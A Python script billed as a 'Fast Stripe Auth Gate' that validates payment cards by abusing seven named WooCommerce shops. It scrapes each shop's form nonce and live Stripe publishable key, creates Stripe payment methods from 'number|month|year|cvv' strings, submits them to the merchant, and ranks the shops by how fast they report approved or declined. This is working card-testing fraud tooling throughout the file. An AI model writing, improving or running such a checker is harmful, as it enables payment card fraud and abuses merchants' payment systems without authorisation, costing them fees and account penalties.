"""
Fast Stripe Auth Gate Experiment
Optimized for minimum response time
"""

try:
    import httpx
    ASYNC_MODE = True
except ImportError:
    ASYNC_MODE = False

import asyncio
import requests
import re
import json
from urllib.parse import urlparse, urljoin
import time

# Test sites
SITES = {
    "buy-fengshui": "https://buy-fengshui.com/",
    "wp-den": "https://wp-den.com/basket/",
    "cleepwearable": "https://www.cleepwearable.com/my-account/add-payment-method/",
    "rgsitebuilder": "https://rgsitebuilder.com/my-account/add-payment-method/",
    "shavercity": "https://shavercity.com.au/checkout/",
    "modsocks": "https://www.modsocks.com/checkout/",
    "goodmansvainilla": "https://goodmansvainilla.com"
}


def parse_card(card_string):
    """Parse card string format: number|month|year|cvv"""
    parts = card_string.split("|")
    if len(parts) != 4:
        return None
    return {
        "number": parts[0].strip(),
        "month": parts[1].strip().zfill(2),
        "year": parts[2].strip(),
        "cvv": parts[3].strip()
    }


async def fast_stripe_auth_woo(site_url, card_string, session=None):
    """
    Fast WooCommerce Stripe Auth Gate
    Optimized for minimum response time
    """
    start_time = time.time()

    card = parse_card(card_string)
    if not card:
        return {"status": "error", "message": "Invalid card format", "time": 0}

    close_session = False
    if session is None:
        session = httpx.AsyncClient(timeout=30.0, follow_redirects=True)
        close_session = True

    try:
        # Step 1: Get add payment method page
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }

        resp = await session.get(site_url, headers=headers)
        html = resp.text

        # Extract nonce
        nonce_match = re.search(r'woocommerce-add-payment-method-nonce["\']?\s*value=["\']([^"\']+)', html)
        if not nonce_match:
            nonce_match = re.search(r'name=["\']woocommerce-add-payment-method-nonce["\'].*?value=["\']([^"\']+)', html)

        if not nonce_match:
            return {"status": "error", "message": "Nonce not found", "time": time.time() - start_time}

        nonce = nonce_match.group(1)

        # Extract publishable key
        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', html)
        if not pk_match:
            pk_match = re.search(r'pk_test_[a-zA-Z0-9]+', html)

        if not pk_match:
            return {"status": "error", "message": "Stripe key not found", "time": time.time() - start_time}

        publishable_key = pk_match.group(0)

        # Step 2: Create Stripe Payment Method
        stripe_data = {
            "type": "card",
            "card[number]": card["number"],
            "card[exp_month]": card["month"],
            "card[exp_year]": card["year"],
            "card[cvc]": card["cvv"],
            "key": publishable_key
        }

        stripe_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        stripe_resp = await session.post(
            "https://api.stripe.com/v1/payment_methods",
            data=stripe_data,
            headers=stripe_headers
        )

        stripe_json = stripe_resp.json()

        if "error" in stripe_json:
            error_msg = stripe_json["error"].get("message", "Unknown error")
            elapsed = time.time() - start_time
            return {
                "status": "declined",
                "message": error_msg,
                "response": error_msg,
                "time": round(elapsed, 2)
            }

        pm_id = stripe_json.get("id")
        if not pm_id:
            return {"status": "error", "message": "No payment method ID", "time": time.time() - start_time}

        # Step 3: Submit to WooCommerce
        woo_data = {
            "payment_method": "stripe",
            "wc-stripe-payment-method": pm_id,
            "woocommerce-add-payment-method-nonce": nonce,
            "_wp_http_referer": urlparse(site_url).path,
            "woocommerce_add_payment_method": "1"
        }

        woo_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": site_url
        }

        woo_resp = await session.post(site_url, data=woo_data, headers=woo_headers)
        woo_text = woo_resp.text

        elapsed = time.time() - start_time

        # Parse response
        if "Payment method successfully added" in woo_text or "successfully added" in woo_text.lower():
            return {
                "status": "approved",
                "message": "Payment method added successfully",
                "response": "APPROVED - AUTH",
                "pm_id": pm_id,
                "time": round(elapsed, 2)
            }
        elif "security check failed" in woo_text.lower() or "invalid nonce" in woo_text.lower():
            return {
                "status": "error",
                "message": "Security check failed",
                "response": "NONCE ERROR",
                "time": round(elapsed, 2)
            }
        elif "declined" in woo_text.lower():
            return {
                "status": "declined",
                "message": "Card declined",
                "response": "DECLINED",
                "time": round(elapsed, 2)
            }
        else:
            # Check for Stripe errors
            error_match = re.search(r'woocommerce-error.*?<li>(.*?)</li>', woo_text, re.DOTALL)
            if error_match:
                error_msg = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
                return {
                    "status": "declined",
                    "message": error_msg,
                    "response": error_msg,
                    "time": round(elapsed, 2)
                }

            return {
                "status": "unknown",
                "message": "Unable to determine result",
                "response": "UNKNOWN",
                "time": round(elapsed, 2)
            }

    except Exception as e:
        elapsed = time.time() - start_time
        return {
            "status": "error",
            "message": str(e),
            "response": f"ERROR: {str(e)}",
            "time": round(elapsed, 2)
        }

    finally:
        if close_session:
            await session.aclose()


def fast_stripe_auth_woo_sync(site_url, card_string):
    """
    Fast WooCommerce Stripe Auth Gate (Synchronous version)
    Optimized for minimum response time - uses requests library
    """
    start_time = time.time()

    card = parse_card(card_string)
    if not card:
        return {"status": "error", "message": "Invalid card format", "time": 0}

    session = requests.Session()
    # Disable proxy to avoid connection issues
    session.trust_env = False

    try:
        # Step 1: Get add payment method page
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }

        resp = session.get(site_url, headers=headers, timeout=30, allow_redirects=True)
        html = resp.text

        # Extract nonce
        nonce_match = re.search(r'woocommerce-add-payment-method-nonce["\']?\s*value=["\']([^"\']+)', html)
        if not nonce_match:
            nonce_match = re.search(r'name=["\']woocommerce-add-payment-method-nonce["\'].*?value=["\']([^"\']+)', html)

        if not nonce_match:
            return {"status": "error", "message": "Nonce not found", "time": time.time() - start_time}

        nonce = nonce_match.group(1)

        # Extract publishable key
        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', html)
        if not pk_match:
            pk_match = re.search(r'pk_test_[a-zA-Z0-9]+', html)

        if not pk_match:
            return {"status": "error", "message": "Stripe key not found", "time": time.time() - start_time}

        publishable_key = pk_match.group(0)

        # Step 2: Create Stripe Payment Method
        stripe_data = {
            "type": "card",
            "card[number]": card["number"],
            "card[exp_month]": card["month"],
            "card[exp_year]": card["year"],
            "card[cvc]": card["cvv"],
            "key": publishable_key
        }

        stripe_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        stripe_resp = session.post(
            "https://api.stripe.com/v1/payment_methods",
            data=stripe_data,
            headers=stripe_headers,
            timeout=30
        )

        stripe_json = stripe_resp.json()

        if "error" in stripe_json:
            error_msg = stripe_json["error"].get("message", "Unknown error")
            elapsed = time.time() - start_time
            return {
                "status": "declined",
                "message": error_msg,
                "response": error_msg,
                "time": round(elapsed, 2)
            }

        pm_id = stripe_json.get("id")
        if not pm_id:
            return {"status": "error", "message": "No payment method ID", "time": time.time() - start_time}

        # Step 3: Submit to WooCommerce
        woo_data = {
            "payment_method": "stripe",
            "wc-stripe-payment-method": pm_id,
            "woocommerce-add-payment-method-nonce": nonce,
            "_wp_http_referer": urlparse(site_url).path,
            "woocommerce_add_payment_method": "1"
        }

        woo_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": site_url
        }

        woo_resp = session.post(site_url, data=woo_data, headers=woo_headers, timeout=30)
        woo_text = woo_resp.text

        elapsed = time.time() - start_time

        # Parse response
        if "Payment method successfully added" in woo_text or "successfully added" in woo_text.lower():
            return {
                "status": "approved",
                "message": "Payment method added successfully",
                "response": "APPROVED - AUTH",
                "pm_id": pm_id,
                "time": round(elapsed, 2)
            }
        elif "security check failed" in woo_text.lower() or "invalid nonce" in woo_text.lower():
            return {
                "status": "error",
                "message": "Security check failed",
                "response": "NONCE ERROR",
                "time": round(elapsed, 2)
            }
        elif "declined" in woo_text.lower():
            return {
                "status": "declined",
                "message": "Card declined",
                "response": "DECLINED",
                "time": round(elapsed, 2)
            }
        else:
            # Check for Stripe errors
            error_match = re.search(r'woocommerce-error.*?<li>(.*?)</li>', woo_text, re.DOTALL)
            if error_match:
                error_msg = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
                return {
                    "status": "declined",
                    "message": error_msg,
                    "response": error_msg,
                    "time": round(elapsed, 2)
                }

            return {
                "status": "unknown",
                "message": "Unable to determine result",
                "response": "UNKNOWN",
                "time": round(elapsed, 2)
            }

    except Exception as e:
        elapsed = time.time() - start_time
        return {
            "status": "error",
            "message": str(e),
            "response": f"ERROR: {str(e)}",
            "time": round(elapsed, 2)
        }

    finally:
        session.close()


async def test_site(site_name, site_url, test_card):
    """Test a single site and measure response time"""
    print(f"\n{'='*60}")
    print(f"Testing: {site_name}")
    print(f"URL: {site_url}")
    print(f"Card: {test_card}")
    print(f"{'='*60}")

    result = await fast_stripe_auth_woo(site_url, test_card)

    print(f"\nStatus: {result['status']}")
    print(f"Response: {result.get('response', result.get('message'))}")
    print(f"Time: {result['time']}s")

    if result.get('pm_id'):
        print(f"Payment Method ID: {result['pm_id']}")

    return result


async def test_all_sites(test_card="4242424242424242|12|2025|123"):
    """Test all sites and compare response times"""
    print("\n" + "="*60)
    print("FAST STRIPE AUTH GATE - TESTING ALL SITES")
    print("="*60)

    results = {}

    for site_name, site_url in SITES.items():
        result = await test_site(site_name, site_url, test_card)
        results[site_name] = result
        await asyncio.sleep(1)  # Small delay between sites

    # Summary
    print("\n" + "="*60)
    print("SUMMARY - Response Times")
    print("="*60)

    sorted_results = sorted(results.items(), key=lambda x: x[1]['time'])

    for site_name, result in sorted_results:
        status_emoji = "✅" if result['status'] == 'approved' else "❌" if result['status'] == 'declined' else "⚠️"
        print(f"{status_emoji} {site_name:20s} - {result['time']:6.2f}s - {result['status'].upper()}")

    fastest = sorted_results[0]
    print(f"\n🏆 Fastest: {fastest[0]} ({fastest[1]['time']}s)")

    return results


async def quick_check(site_url, card_string):
    """Quick single check - optimized for speed (async)"""
    return await fast_stripe_auth_woo(site_url, card_string)


# Synchronous versions
def test_site_sync(site_name, site_url, test_card):
    """Test a single site and measure response time (synchronous)"""
    print(f"\n{'='*60}")
    print(f"Testing: {site_name}")
    print(f"URL: {site_url}")
    print(f"Card: {test_card}")
    print(f"{'='*60}")

    result = fast_stripe_auth_woo_sync(site_url, test_card)

    print(f"\nStatus: {result['status']}")
    print(f"Response: {result.get('response', result.get('message'))}")
    print(f"Time: {result['time']}s")

    if result.get('pm_id'):
        print(f"Payment Method ID: {result['pm_id']}")

    return result


def test_all_sites_sync(test_card="4242424242424242|12|2025|123"):
    """Test all sites and compare response times (synchronous)"""
    print("\n" + "="*60)
    print("FAST STRIPE AUTH GATE - TESTING ALL SITES")
    print("="*60)

    results = {}

    for site_name, site_url in SITES.items():
        result = test_site_sync(site_name, site_url, test_card)
        results[site_name] = result
        time.sleep(1)  # Small delay between sites

    # Summary
    print("\n" + "="*60)
    print("SUMMARY - Response Times")
    print("="*60)

    sorted_results = sorted(results.items(), key=lambda x: x[1]['time'])

    for site_name, result in sorted_results:
        status_emoji = "✅" if result['status'] == 'approved' else "❌" if result['status'] == 'declined' else "⚠️"
        print(f"{status_emoji} {site_name:20s} - {result['time']:6.2f}s - {result['status'].upper()}")

    fastest = sorted_results[0]
    print(f"\n🏆 Fastest: {fastest[0]} ({fastest[1]['time']}s)")

    return results


def quick_check_sync(site_url, card_string):
    """Quick single check - optimized for speed (synchronous)"""
    return fast_stripe_auth_woo_sync(site_url, card_string)


if __name__ == "__main__":
    # Test with Stripe test card
    TEST_CARD = "4242424242424242|12|2025|123"

    # Use sync version for better compatibility
    if ASYNC_MODE:
        print("Using async mode (httpx available)")
        asyncio.run(test_all_sites(TEST_CARD))
    else:
        print("Using sync mode (requests library)")
        test_all_sites_sync(TEST_CARD)
